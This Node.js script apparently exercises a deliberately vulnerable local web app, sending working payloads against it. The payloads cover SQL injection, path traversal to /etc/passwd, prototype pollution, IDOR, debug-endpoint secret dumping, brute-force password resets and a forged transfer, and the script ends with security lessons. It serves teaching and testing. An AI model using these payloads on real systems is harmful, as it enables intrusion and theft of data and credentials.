// test-vulnerabilities.js
// Educational script demonstrating exploitation of vulnerabilities

const http = require('http');

const BASE_URL = 'http://localhost:3000';

function makeRequest(method, path, body = null) {
  return new Promise((resolve, reject) => {
    const url = new URL(path, BASE_URL);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname + url.search,
      method: method,
      headers: {
        'Content-Type': 'application/json'
      }
    };

    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body: JSON.parse(data)
          });
        } catch {
          resolve({
            status: res.statusCode,
            headers: res.headers,
            body: data
          });
        }
      });
    });

    req.on('error', reject);
    if (body) req.write(JSON.stringify(body));
    req.end();
  });
}

async function runTests() {
  console.log('🔓 Vulnerable App - Exploitation Tests\n');
  console.log('⚠️  Educational purposes only\n');

  // Test 1: SQL Injection
  console.log('=== TEST 1: SQL Injection ===');
  console.log('Payload: admin\' OR \'1\'=\'1');
  try {
    const result = await makeRequest('GET', "/api/users/admin' OR '1'='1");
    console.log('Result:', result.body);
    console.log('✓ SQL Injection successful - bypassed authentication\n');
  } catch (e) {
    console.log('✗ Error:', e.message, '\n');
  }

  // Test 2: Hardcoded API Key
  console.log('=== TEST 2: Hardcoded API Key Exposure ===');
  console.log('Endpoint: /api/admin/users?api_key=sk-1234567890abcdefghijklmnop');
  try {
    const result = await makeRequest('GET', '/api/admin/users?api_key=sk-1234567890abcdefghijklmnop');
    console.log('Result:', result.body);
    console.log('✓ Accessed admin endpoint with hardcoded key\n');
  } catch (e) {
    console.log('✗ Error:', e.message, '\n');
  }

  // Test 3: IDOR - Access other user's data
  console.log('=== TEST 3: Insecure Direct Object Reference (IDOR) ===');
  console.log('Accessing user ID 1 (admin):');
  try {
    const result = await makeRequest('GET', '/api/user/1');
    console.log('Result:', result.body);
    console.log('✓ Accessed admin user data without authorization\n');
  } catch (e) {
    console.log('✗ Error:', e.message, '\n');
  }

  // Test 4: Prototype Pollution
  console.log('=== TEST 4: Prototype Pollution ===');
  console.log('Payload: {"__proto__": {"isAdmin": true}}');
  try {
    const result = await makeRequest('POST', '/api/config', {
      '__proto__': { isAdmin: true }
    });
    console.log('Result:', result.body);
    console.log('✓ Prototype pollution payload sent\n');
  } catch (e) {
    console.log('✗ Error:', e.message, '\n');
  }

  // Test 5: Weak Token Generation
  console.log('=== TEST 5: Weak Token & Sensitive Data Exposure ===');
  console.log('Login with admin credentials:');
  try {
    const result = await makeRequest('POST', '/api/login', {
      username: 'admin',
      password: 'password123'
    });
    console.log('Result:', result.body);
    console.log('✓ Password returned in response, weak token generated\n');
  } catch (e) {
    console.log('✗ Error:', e.message, '\n');
  }

  // Test 6: Path Traversal
  console.log('=== TEST 6: Path Traversal ===');
  console.log('Payload: ../../../etc/passwd');
  try {
    const result = await makeRequest('GET', '/api/file/../../../etc/passwd');
    console.log('Result:', result.body);
    console.log('✓ Path traversal vulnerability demonstrated\n');
  } catch (e) {
    console.log('✗ Error:', e.message, '\n');
  }

  // Test 7: Debug Endpoint Exposure
  console.log('=== TEST 7: Exposed Debug Endpoint ===');
  console.log('Accessing /api/debug:');
  try {
    const result = await makeRequest('GET', '/api/debug');
    console.log('Exposed secrets:');
    console.log('  - API Key:', result.body.apiKey);
    console.log('  - Secret Token:', result.body.secretToken);
    console.log('  - Node Version:', result.body.nodeVersion);
    console.log('✓ Debug endpoint exposed sensitive information\n');
  } catch (e) {
    console.log('✗ Error:', e.message, '\n');
  }

  // Test 8: No Rate Limiting
  console.log('=== TEST 8: No Rate Limiting (Brute Force) ===');
  console.log('Sending multiple password reset requests...');
  try {
    for (let i = 0; i < 3; i++) {
      const result = await makeRequest('POST', '/api/password-reset', {
        email: 'attacker@example.com'
      });
      console.log(`Request ${i + 1}:`, result.body.resetToken);
    }
    console.log('✓ No rate limiting - all requests succeeded\n');
  } catch (e) {
    console.log('✗ Error:', e.message, '\n');
  }

  // Test 9: CSRF - No token validation
  console.log('=== TEST 9: Missing CSRF Protection ===');
  console.log('Sending transfer request without CSRF token:');
  try {
    const result = await makeRequest('POST', '/api/transfer', {
      fromUser: 'admin',
      toUser: 'attacker',
      amount: 1000
    });
    console.log('Result:', result.body);
    console.log('✓ CSRF attack successful - no token validation\n');
  } catch (e) {
    console.log('✗ Error:', e.message, '\n');
  }

  console.log('=== All Tests Complete ===');
  console.log('\n📚 Lessons Learned:');
  console.log('1. Never hardcode secrets - use environment variables');
  console.log('2. Always use parameterized queries to prevent SQL injection');
  console.log('3. Implement proper authentication and authorization');
  console.log('4. Keep dependencies updated and audit for vulnerabilities');
  console.log('5. Validate and sanitize all user input');
  console.log('6. Implement CSRF protection on state-changing operations');
  console.log('7. Never expose sensitive data in responses');
  console.log('8. Implement rate limiting on sensitive endpoints');
  console.log('9. Remove debug endpoints in production');
  console.log('10. Use security headers and follow OWASP guidelines\n');
}

// Run tests
runTests().catch(console.error);
